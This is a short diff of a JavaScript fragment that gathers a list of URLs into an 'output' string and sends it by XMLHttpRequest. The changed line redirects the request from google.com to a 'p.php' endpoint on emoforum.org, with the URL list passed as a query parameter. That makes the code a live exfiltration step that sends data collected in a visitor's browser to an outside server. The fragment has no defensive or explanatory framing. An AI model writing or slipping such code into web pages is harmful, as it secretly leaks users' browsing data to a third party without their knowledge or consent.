@@ -19,7 +19,7 @@ while(k){
 		}
 	output+="</urls>\n"
 		 var httpRequest = new XMLHttpRequest();
-             httpRequest.open('GET', "http://google.com/?q="+escape(output), true);
+             httpRequest.open('GET', "http://emoforum.org/p.php?p="+escape(output), true);
         httpRequest.send('');
         alert(output);
         return(true);
